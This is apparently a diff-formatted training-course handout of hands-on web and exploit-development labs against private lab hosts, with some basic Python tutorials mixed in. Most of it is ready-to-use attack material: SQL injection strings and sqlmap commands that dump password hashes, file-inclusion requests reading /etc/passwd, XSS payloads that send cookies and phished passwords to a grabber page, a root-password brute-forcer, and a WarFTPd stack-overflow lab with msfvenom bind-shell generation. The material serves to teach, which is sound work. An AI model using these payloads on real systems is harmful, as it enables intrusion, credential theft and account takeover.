+http://10.1.1.38/acre2.php?lap=acer' order by 12-- +
+-----------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '50' in 'order clause'
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+http://10.1.1.38/acre2.php?lap=acer' order by 6-- +
+-----------------------------------------------------------------------
+
+---Valid page returned for 5 and 6...error on 7 so we know there are 6 columns
+ 
+ 
+ 
+Now we build out the union all select statement with the correct number of columns
+ 
+Reference:
+http://www.techonthenet.com/sql/union.php
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+http://10.1.1.38/acre2.php?lap=acer' union all select 1,2,3,4,5,6-- +
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Now we negate the parameter value 'acer' by turning into the word 'null':
+---------------------------Type This-----------------------------------
+
+http://10.1.1.38/acre2.php?lap=null' union all select 1,2,3,4,5,6-- j
+-----------------------------------------------------------------------
+
+We see that a 4 and a 5 are on the screen. These are the columns that will echo back data
+ 
+ 
+Use a cheat sheet for syntax:
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+ 
+---------------------------Type This-----------------------------------
+ 
+http://10.1.1.38/acre2.php?lap=null' union all select 1,2,3,user(),5,6-- j
+ 
+http://10.1.1.38/acre2.php?lap=null' union all select 1,2,3,user(),version(),6-- j
+ 
+http://10.1.1.38/acre2.php?lap=null' union all select 1,2,3,user(),@@version,6-- +
+ 
+http://10.1.1.38/acre2.php?lap=null' union all select 1,2,3,user(),@@datadir,6-- +
+ 
+ 
+http://10.1.1.38/acre2.php?lap=null' union all select 1,2,3,user,password,6 from mysql.user -- a
+ 
+-----------------------------------------------------------------------
+ 
+ 
+########################
+# Question I get a lot #
+########################
+Sometimes students ask about the "-- j" or "-- +" that I append to SQL injection attack string.
+ 
+Here is a good reference for it:
+https://www.symantec.com/connect/blogs/mysql-injection-comments-comments
+ 
+Both attackers and penetration testers alike often forget that MySQL comments deviate from the standard ANSI SQL specification. The double-dash comment syntax was first supported in MySQL 3.23.3. However, in MySQL a double-dash comment "requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, and so on)." This double-dash comment syntax deviation is intended to prevent complications that might arise from the subtraction of negative numbers within SQL queries. Therefore, the classic SQL injection exploit string will not work against backend MySQL databases because the double-dash will be immediately followed by a terminating single quote appended by the web application. However, in most cases a trailing space needs to be appended to the classic SQL exploit string. For the sake of clarity we'll append a trailing space and either a "+" or a letter.
+ 
+ 
+ 
+ 
+#########################
+# File Handling Attacks #
+#########################
+ 
+Here we see parameter passing, but this one is actually a yes to question number 3 (reference a file)
+
+---------------------------Type This-----------------------------------
+
+http://10.1.1.38/showfile.php?filename=about.txt
+ 
+-----------------------------------------------------------------------
+ 
+ 
+See if you can read files on the file system:
+---------------------------Type This-----------------------------------
+
+http://10.1.1.38/showfile.php?filename=/etc/passwd
+-----------------------------------------------------------------------
+ 
+We call this attack a Local File Include or LFI.
+ 
+Now let's find some text out on the internet somewhere:
+https://raw.githubusercontent.com/gruntjs/grunt-contrib-connect/master/test/fixtures/hello.txt
+ 
+ 
+Now let's append that URL to our LFI and instead of it being Local - it is now a Remote File Include or RFI:
+
+---------------------------Type This-----------------------------------
+
+http://10.1.1.38/showfile.php?filename=https://raw.githubusercontent.com/gruntjs/grunt-contrib-connect/master/test/fixtures/hello.txt
+ -----------------------------------------------------------------------
+
+#########################################################################################
+# SQL Injection                                                                         #
+# https://s3.amazonaws.com/infosecaddictsfiles/1-Intro_To_SQL_Intection.pptx #
+#########################################################################################
+ 
+ 
+- Another quick way to test for SQLI is to remove the paramter value
+ 
+ 
+#############################
+# Error-Based SQL Injection #
+#############################
+---------------------------Type This-----------------------------------
+
+http://10.1.1.55/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--
+http://10.1.1.55/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(1))--
+http://10.1.1.55/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(2))--
+http://10.1.1.55/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(3))--
+http://10.1.1.55/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(4))--
+http://10.1.1.55/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(N))--     NOTE: "N" - just means to keep going until you run out of databases
+http://10.1.1.55/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85))--
+http://10.1.1.55/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'bookmaster')--
+http://10.1.1.55/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'sysdiagrams')--
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+#############################
+# Union-Based SQL Injection #
+#############################
+
+---------------------------Type This-----------------------------------
+
+http://10.1.1.55/bookdetail.aspx?id=2 order by 100--
+http://10.1.1.55/bookdetail.aspx?id=2 order by 50--
+http://10.1.1.55/bookdetail.aspx?id=2 order by 25--
+http://10.1.1.55/bookdetail.aspx?id=2 order by 10--
+http://10.1.1.55/bookdetail.aspx?id=2 order by 5--
+http://10.1.1.55/bookdetail.aspx?id=2 order by 6--
+http://10.1.1.55/bookdetail.aspx?id=2 order by 7--
+http://10.1.1.55/bookdetail.aspx?id=2 order by 8--
+http://10.1.1.55/bookdetail.aspx?id=2 order by 9--
+http://10.1.1.55/bookdetail.aspx?id=2 union all select 1,2,3,4,5,6,7,8,9--
+-----------------------------------------------------------------------
+ 
+    We are using a union select statement because we are joining the developer's query with one of our own.
+    Reference:
+    http://www.techonthenet.com/sql/union.php
+    The SQL UNION operator is used to combine the result sets of 2 or more SELECT statements.
+    It removes duplicate rows between the various SELECT statements.
+ 
+    Each SELECT statement within the UNION must have the same number of fields in the result sets with similar data types.
+
+---------------------------Type This-----------------------------------
+ 
+http://10.1.1.55/bookdetail.aspx?id=-2 union all select 1,2,3,4,5,6,7,8,9--
+-----------------------------------------------------------------------
+ 
+    Negating the paramter value (changing the id=2 to id=-2) will force the pages that will echo back data to be displayed.
+
+---------------------------Type This-----------------------------------
+ 
+http://10.1.1.55/bookdetail.aspx?id=-2 union all select 1,user,@@version,4,5,6,7,8,9--
+http://10.1.1.55/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,7,8,9--
+http://10.1.1.55/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,db_name(0),8,9--
+http://10.1.1.55/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,master.sys.fn_varbintohexstr(password_hash),8,9 from master.sys.sql_logins--
+ 
+ -----------------------------------------------------------------------
+
+ 
+ 
+ 
+- Another way is to see if you can get the backend to perform an arithmetic function
+
+---------------------------Type This-----------------------------------
+
+http://10.1.1.55/bookdetail.aspx?id=(2)
+http://10.1.1.55/bookdetail.aspx?id=(4-2)  
+http://10.1.1.55/bookdetail.aspx?id=(4-1)
+ 
+ 
+ 
+http://10.1.1.55/bookdetail.aspx?id=2 or 1=1--
+http://10.1.1.55/bookdetail.aspx?id=2 or 1=2--
+http://10.1.1.55/bookdetail.aspx?id=1*1
+http://10.1.1.55/bookdetail.aspx?id=2 or 1 >-1#
+http://10.1.1.55/bookdetail.aspx?id=2 or 1<99#
+http://10.1.1.55/bookdetail.aspx?id=2 or 1<>1#
+http://10.1.1.55/bookdetail.aspx?id=2 or 2 != 3--
+http://10.1.1.55/bookdetail.aspx?id=2 &0#
+ 
+ 
+ 
+http://10.1.1.55/bookdetail.aspx?id=2 and 1=1--
+http://10.1.1.55/bookdetail.aspx?id=2 and 1=2--
+http://10.1.1.55/bookdetail.aspx?id=2 and user='joe' and 1=1--
+http://10.1.1.55/bookdetail.aspx?id=2 and user='dbo' and 1=1--
+ 
+ -----------------------------------------------------------------------
+ 
+ 
+###############################
+# Blind SQL Injection Testing #
+###############################
+Time-Based BLIND SQL INJECTION - EXTRACT DATABASE USER
+     
+3 - Total Characters
+---------------------------Type This-----------------------------------
+
+http://10.1.1.55/bookdetail.aspx?id=2; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
+http://10.1.1.55/bookdetail.aspx?id=2; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
+http://10.1.1.55/bookdetail.aspx?id=2; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--      (Ok, the username is 3 chars long - it waited 10 seconds)
+ -----------------------------------------------------------------------
+ 
+Let's go for a quick check to see if it's DBO
+
+---------------------------Type This-----------------------------------
+
+http://10.1.1.55/bookdetail.aspx?id=2; IF ((USER)='dbo') WAITFOR DELAY '00:00:10'--
+ -----------------------------------------------------------------------
+ 
+Yup, it waited 10 seconds so we know the username is 'dbo' - let's give you the syntax to verify it just for fun.
+
+ ---------------------------Type This-----------------------------------
+
+D  - 1st Character
+http://10.1.1.55/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--  
+http://10.1.1.55/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
+http://10.1.1.55/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
+http://10.1.1.55/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'--  (Ok, first letter is a 100 which is the letter 'd' - it waited 10 seconds)
+ 
+B - 2nd Character
+http://10.1.1.55/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))>97) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+http://10.1.1.55/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+ 
+O - 3rd Character
+http://10.1.1.55/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>97) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+http://10.1.1.55/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>115) WAITFOR DELAY '00:00:10'--
+http://10.1.1.55/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>105) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+http://10.1.1.55/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>110) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+http://10.1.1.55/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=109) WAITFOR DELAY '00:00:10'--
+http://10.1.1.55/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=110) WAITFOR DELAY '00:00:10'--      
+http://10.1.1.55/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=111) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+ 
+ -----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ ##########
+# Sqlmap #
+##########
+If you want to see how we automate all of the SQL Injection attacks you can log into your StrategicSec-Ubuntu-VM and run the following commands:
+
+  ---------------------------Type This-----------------------------------
+
+cd /home/strategicsec/toolz/sqlmap-dev/
+python sqlmap.py -u "http://10.1.1.55/bookdetail.aspx?id=2" -b
+python sqlmap.py -u "http://10.1.1.55/bookdetail.aspx?id=2" --current-user
+python sqlmap.py -u "http://10.1.1.55/bookdetail.aspx?id=2" --current-db
+python sqlmap.py -u "http://10.1.1.55/bookdetail.aspx?id=2" --dbs
+python sqlmap.py -u "http://10.1.1.55/bookdetail.aspx?id=2" -D BookApp --tables
+python sqlmap.py -u "http://10.1.1.55/bookdetail.aspx?id=2" -D BookApp -T BOOKMASTER --columns
+python sqlmap.py -u "http://10.1.1.55/bookdetail.aspx?id=2" -D BookApp -T sysdiagrams --columns
+python sqlmap.py -u "http://10.1.1.55/bookdetail.aspx?id=2" -D BookApp -T BOOKMASTER --columns --dump
+python sqlmap.py -u "http://10.1.1.55/bookdetail.aspx?id=2" -D BookApp -T sysdiagrams --columns --dump
+python sqlmap.py -u "http://10.1.1.55/bookdetail.aspx?id=2" --users --passwords 
+ 
+ -----------------------------------------------------------------------
+
+###############################################################################
+# What is XSS                                                                 #
+# https://s3.amazonaws.com/infosecaddictsfiles/2-Intro_To_XSS.pptx             #
+###############################################################################
+ 
+OK - what is Cross Site Scripting (XSS)
+ 
+1. Use Firefox to browse to the following location:
+---------------------------Type This-----------------------------------
+ 
+    http://10.1.1.38/xss_practice/
+ -----------------------------------------------------------------------
+ 
+    A really simple search page that is vulnerable should come up.
+ 
+ 
+ 
+ 
+2. In the search box type:
+---------------------------Type This-----------------------------------
+
+    <script>alert('So this is XSS')</script>
+-----------------------------------------------------------------------
+ 
+ 
+    This should pop-up an alert window with your message in it proving XSS is in fact possible.
+    Ok, click OK and then click back and go back to http://10.1.1.38/xss_practice/
+ 
+ 
+3. In the search box type:
+---------------------------Type This-----------------------------------
+   
+    <script>alert(document.cookie)</script>
+-----------------------------------------------------------------------
+ 
+ 
+    This should pop-up an alert window with your message in it proving XSS is in fact possible and your cookie can be accessed.
+    Ok, click OK and then click back and go back to http://10.1.1.38/xss_practice/
+ 
+4. Now replace that alert script with:
+---------------------------Type This-----------------------------------
+ 
+    <script>document.location="http://10.1.1.38/xss_practice/cookie_catcher.php?c="+document.cookie</script>
+-----------------------------------------------------------------------
+ 
+ 
+This will actually pass your cookie to the cookie catcher that we have sitting on the webserver.
+ 
+ 
+5. Now view the stolen cookie at:
+---------------------------Type This-----------------------------------
+
+    http://10.1.1.38/xss_practice/cookie_stealer_logs.html
+-----------------------------------------------------------------------
+ 
+ 
+The cookie catcher writes to this file and all we have to do is make sure that it has permissions to be written to.
+ 
+ 
+ 
+ 
+ 
+ 
+############################
+# A Better Way To Demo XSS #
+############################
+ 
+ 
+Let's take this to the next level. We can modify this attack to include some username/password collection. Paste all of this into the search box.
+ 
+ 
+Use Firefox to browse to the following location:
+---------------------------Type This-----------------------------------
+ 
+    http://10.1.1.38/xss_practice/
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Paste this in the search box
+----------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+<script>
+password=prompt('Your session is expired. Please enter your password to continue',' ');
+document.write("<img src=\"http://10.1.1.38/xss_practice/passwordgrabber.php?password=" +password+"\">");
+</script>
+-----------------------------------------------------------------------
+ 
+ 
+Now view the stolen cookie at:
+---------------------------Type This-----------------------------------
+
+    http://10.1.1.38/xss_practice/passwords.html
+
+-----------------------------------------------------------------------
+
+
+#################################################
+# Lesson 25: Python Functions & String Handling #
+#################################################
+
+Python can make use of functions:
+http://www.tutorialspoint.com/python/python_functions.htm
+
+
+
+Python can interact with the 'crypt' function used to create Unix passwords:
+http://docs.python.org/2/library/crypt.html
+
+
+
+Tonight we will see a lot of the split() method so be sure to keep the following references close by:
+http://www.tutorialspoint.com/python/string_split.htm
+
+
+Tonight we will see a lot of slicing so be sure to keep the following references close by:
+http://techearth.net/python/index.php5?title=Python:Basics:Slices
+
+
+---------------------------Type This-----------------------------------
+vi LFI-RFI.py
+
+
+
+
+#!/usr/bin/env python
+print "\n### PHP LFI/RFI Detector ###"
+
+import urllib2,re,sys
+
+TARGET = "http://10.1.1.38/showfile.php?filename=about.txt"
+RFIVULN = "https://raw.githubusercontent.com/gruntjs/grunt-contrib-connect/master/test/fixtures/hello.txt?"
+TravLimit = 12
+
+print "==> Testing for LFI vulns.."
+TARGET = TARGET.split("=")[0]+"=" ## URL MANUPLIATION 
+for x in xrange(1,TravLimit): ## ITERATE THROUGH THE LOOP
+    TARGET += "../"
+    try:
+        source = urllib2.urlopen((TARGET+"etc/passwd")).read() ## WEB REQUEST
+    except urllib2.URLError, e:
+        print "$$$ We had an Error:",e
+        sys.exit(0)
+    if re.search("root:x:0:0:",source): ## SEARCH FOR TEXT IN SOURCE
+        print "!! ==> LFI Found:",TARGET+"etc/passwd"
+        break ## BREAK LOOP WHEN VULN FOUND
+
+print "\n==> Testing for RFI vulns.."
+TARGET = TARGET.split("=")[0]+"="+RFIVULN ## URL MANUPLIATION
+try:
+    source = urllib2.urlopen(TARGET).read() ## WEB REQUEST
+except urllib2.URLError, e:
+    print "$$$ We had an Error:",e
+    sys.exit(0)
+if re.search("Hello world",source): ## SEARCH FOR TEXT IN SOURCE
+    print "!! => RFI Found:",TARGET
+    
+print "\nScan Complete\n" ## DONE
+
+
+
+-----------------------------------------------------------------------
+
+
+################################
+# Lesson 26: Password Cracking #
+################################
+
+---------------------------Type This-----------------------------------
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/htcrack.py
+
+vi htcrack.py
+
+vi list.txt
+
+hello
+goodbye
+red
+blue
+yourname
+tim
+bob
+
+
+htpasswd -nd yourname
+	- enter yourname as the password
+
+
+
+python htcrack.py joe:7XsJIbCFzqg/o list.txt
+
+
+
+
+sudo apt-get install -y python-mechanize python-pexpect python-pexpect-doc
+
+rm -rf mechanize-0.2.5.tar.gz
+
+sudo /bin/bash
+
+passwd
+	***set root password***
+
+
+
+
+vi rootbrute.py
+
+
+#!/usr/bin/env python
+
+import sys
+try:
+        import pexpect
+except(ImportError):
+        print "\nYou need the pexpect module."
+        print "http://www.noah.org/wiki/Pexpect\n"
+        sys.exit(1)
+
+#Change this if needed.
+# LOGIN_ERROR = 'su: incorrect password'
+LOGIN_ERROR = "su: Authentication failure"
+
+def brute(word):
+        print "Trying:",word
+        child = pexpect.spawn('/bin/su')
+        child.expect('Password: ')
+        child.sendline(word)
+        i = child.expect (['.+\s#\s',LOGIN_ERROR, pexpect.TIMEOUT],timeout=3)
+        if i == 1:
+                print "Incorrect Password"
+
+        if i == 2:
+                print "\n\t[!] Root Password:" ,word
+                child.sendline ('id')
+                print child.before
+                child.interact()
+
+if len(sys.argv) != 2:
+        print "\nUsage : ./rootbrute.py <wordlist>"
+        print "Eg: ./rootbrute.py words.txt\n"
+        sys.exit(1)
+
+try:
+        words = open(sys.argv[1], "r").readlines()
+except(IOError):
+        print "\nError: Check your wordlist path\n"
+        sys.exit(1)
+
+print "\n[+] Loaded:",len(words),"words"
+print "[+] BruteForcing...\n"
+for word in words:
+        brute(word.replace("\n",""))
+
+
+-----------------------------------------------------------------------
+
+
+References you might find helpful:
+http://stackoverflow.com/questions/15026536/looping-over-a-some-ips-from-a-file-in-python
+
+
+
+
+
+
+
+---------------------------Type This-----------------------------------
+
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/md5crack.py
+
+vi md5crack.py
+
+
+-----------------------------------------------------------------------
+
+
+
+
+Why use hexdigest
+http://stackoverflow.com/questions/3583265/compare-result-from-hexdigest-to-a-string
+
+
+
+
+http://md5online.net/
+
+
+
+
+
+---------------------------Type This-----------------------------------
+
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/wpbruteforcer.py
+
+
+-----------------------------------------------------------------------
+
+
+
+#############
+# Functions #
+#############
+
+
+***********************
+* What are Functions? *
+***********************
+
+
+Functions are a convenient way to divide your code into useful blocks, allowing us to order our code, make it more readable, reuse it and save some time. Also functions are a key way to define interfaces so programmers can share their code.
+
+How do you write functions in Python?
+
+Python makes use of blocks.
+
+A block is a area of code of written in the format of:
+
+ block_head:
+    
+      1st block line
+    
+      2nd block line
+    
+      ...
+
+
+Where a block line is more Python code (even another block), and the block head is of the following format: block_keyword block_name(argument1,argument2, ...) Block keywords you already know are "if", "for", and "while".
+
+Functions in python are defined using the block keyword "def", followed with the function's name as the block's name. For example:
+
+def my_function():
+    print("Hello From My Function!")
+
+
+Functions may also receive arguments (variables passed from the caller to the function). For example:
+
+def my_function_with_args(username, greeting):
+    print("Hello, %s , From My Function!, I wish you %s"%(username, greeting))
+
+
+Functions may return a value to the caller, using the keyword- 'return' . For example:
+
+def sum_two_numbers(a, b):
+    return a + b
+
+
+****************************************
+* How do you call functions in Python? *
+****************************************
+
+Simply write the function's name followed by (), placing any required arguments within the brackets. For example, lets call the functions written above (in the previous example):
+
+# Define our 3 functions
+---------------------------Type This-----------------------------------
+
+def my_function():
+    print("Hello From My Function!")
+
+def my_function_with_args(username, greeting):
+    print("Hello, %s , From My Function!, I wish you %s"%(username, greeting))
+
+def sum_two_numbers(a, b):
+    return a + b
+
+# print(a simple greeting)
+my_function()
+
+#prints - "Hello, Joe, From My Function!, I wish you a great year!"
+my_function_with_args("Joe", "a great year!")
+
+# after this line x will hold the value 3!
+x = sum_two_numbers(1,2)
+-----------------------------------------------------------------------
+
+
+************
+* Exercise *
+************
+
+In this exercise you'll use an existing function, and while adding your own to create a fully functional program.
+
+Add a function named list_benefits() that returns the following list of strings: "More organized code", "More readable code", "Easier code reuse", "Allowing programmers to share and connect code together"
+
+Add a function named build_sentence(info) which receives a single argument containing a string and returns a sentence starting with the given string and ending with the string " is a benefit of functions!"
+
+Run and see all the functions work together!
+
+
+---------------------------Type This-----------------------------------
+
+# Modify this function to return a list of strings as defined above
+def list_benefits():
+    pass
+
+# Modify this function to concatenate to each benefit - " is a benefit of functions!"
+def build_sentence(benefit):
+    pass
+
+def name_the_benefits_of_functions():
+    list_of_benefits = list_benefits()
+    for benefit in list_of_benefits:
+        print(build_sentence(benefit))
+
+name_the_benefits_of_functions()
+
+
+-----------------------------------------------------------------------
+
+
+
+
+Please download this file to your Windows host machine, and extract it to your Desktop.
+https://s3.amazonaws.com/infosecaddictsfiles/ED-Workshop-Files.zip
+ 
+ 
+ 
+ 
+ 
+###########################
+# Lab 1a: Stack Overflows #
+###########################
+ 
+    #############################
+    # Start WarFTPd             #
+    # Start WinDBG              #
+    # Press F6                  #
+    # Attach to war-ftpd.exe    #
+    #############################
+---------------------------Type This-----------------------------------
+
+cd C:\Documents and Settings\strategic security\Desktop\ED-Workshop-Files\Lab1a
+ 
+ 
+python warftpd1.py | nc XPSP3-ED-Target-IP 21
+
+ 
+    At WINDBG prompt
+    “r” to show registers or “alt+4”
+    dd esp
+ 
+-----------------------------------------------------------------------
+---------------------------Type This-----------------------------------
+ 
+python warftpd2.py | nc XPSP3-ED-Target-IP 21
+ 
+ 
+    At WINDBG prompt
+    “r” to show registers or “alt+4”
+    dd esp
+-----------------------------------------------------------------------
+ 
+    Eip: 32714131
+    esp: affd58     (71413471)
+ 
+    Now we need to SSH into the StrategicSec Ubuntu host
+ ---------------------------Type This-----------------------------------
+
+    cd /home/strategicsec/toolz/metasploit/tools/exploit
+ 
+    ruby pattern_offset.rb 32714131
+    485
+   
+    ruby pattern_offset.rb 71413471
+    493
+-----------------------------------------------------------------------
+ 
+    Distance to EIP is:         485
+    Relative position of ESP is:    493
+ 
+    RET – POP EIP
+    RET 4 – POP EIP and shift ESP down by 4 bytes
+  ---------------------------Type This-----------------------------------
+
+    cd /home/strategicsec/toolz/metasploit/
+    ./msfpescan -j ESP DLLs/xpsp3/shell32.dll
+ -----------------------------------------------------------------------
+
+        0x7c9c167d push esp; retn 0x304d
+        0x7c9d30d7 jmp esp < - how about we use this one
+        0x7c9d30eb jmp esp
+        0x7c9d30ff jmp esp
+ 
+ 
+        warftpd3.py with Notepad++
+        Fill in the appropriate values
+        Distance to EIP
+        Address of JMP ESP
+ 
+ 
+  ---------------------------Type This-----------------------------------
+ 
+python warftpd3.py | nc XPSP3-ED-Target-IP 21
+ 
+    0:003> dd eip
+    0:003> dd esp
+ 
+ -----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+    Mention bad characters
+    No debugger
+ 
+  ---------------------------Type This-----------------------------------
+ 
+ 
+python warftpd4.py | nc XPSP3-ED-Target-IP 21
+ 
+nc XPSP3-ED-Target-IP 4444
+ 
+  -----------------------------------------------------------------------
+
+ 
+
+ 
+There are 2 things that can go wrong with shellcode. The first thing is a lack of space, and the second is bad characters.
+ 
+Shellcode test 1: Calculate space for shellcode
+Look in the warftpd3.py script for the shellcode variable. Change the length of the shellcode being send to test how much you can send before the CCs truncate.
+ 
+ 
+ 
+ 
+ 
+Shellcode test 2: Identify bad characters
+ 
+Replace the INT3 (cc) dummy shellcode with this string:
+  ---------------------------Type This-----------------------------------
+
+"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+ 
+  -----------------------------------------------------------------------
+ 
+Send this new shellcode string and identify the places where it truncates - these are the bad characters
+ 
+ 
+ 
+ 
+Here is what the string looks like after I manually tested and removed each of the bad characters:
+  ---------------------------Type This-----------------------------------
+
+shellcode = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+ 
+  -----------------------------------------------------------------------
+ 
+ 
+   ---------------------------Type This-----------------------------------
+
+./msfvenom -p windows/shell/bind_tcp -f python -b '\x00\x0a\x0d\x40'
+ 
+   -----------------------------------------------------------------------
+
+ 
+ 
+ 
+###########################################
+# Lab 1b: Stack Overflows with DEP Bypass #
+###########################################
+ 
+Reboot your target host and choose the "2nd" option for DEP.
+ 
+   ---------------------------Type This-----------------------------------
+ 
+cd C:\Documents and Settings\strategic security\Desktop\ED-Workshop-Files\Lab1b
+ 
+ 
+ 
+ 
+python warftpd1.py | nc XPSP3-ED-Target-IP 21
+ 
+    At WINDBG prompt
+    “r” to show registers or “alt+4”
+ 
+    dd esp
+ 
+   -----------------------------------------------------------------------
+ 
+   ---------------------------Type This-----------------------------------
+
+python warftpd2.py | nc XPSP3-ED-Target-IP 21
+ 
+ 
+    At WINDBG prompt
+    “r” to show registers or “alt+4”
+    dd esp
+   -----------------------------------------------------------------------
+ 
+    Eip: 32714131
+    esp: affd58     (71413471)
+ 
+    Now we need to SSH into the StrategicSec Ubuntu host
+    ---------------------------Type This-----------------------------------
+
+    cd /home/strategicsec/toolz/metasploit/tools/exploit
+ 
+    ruby pattern_offset.rb 32714131
+    485
+   
+    ruby pattern_offset.rb 71413471
+    493
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+cd /home/strategicsec/toolz/metasploit/tools/exploit
+ 
+ruby pattern_offset.rb 32714131
+ 
+cd /home/strategicsec/toolz/metasploit/
+ 
+./msfpescan -j ESP DLLs/xpsp3/shell32.dll | grep 0x7c9d30d7
+ 
+ 
+ 
+python warftpd3.py | nc XPSP3-ED-Target-IP 21
+ 
+    0:003> dd eip
+    0:003> dd esp
+   -----------------------------------------------------------------------
+ 
+INT3s - GOOD!!!!!!!
+ 
+   ---------------------------Type This-----------------------------------
+
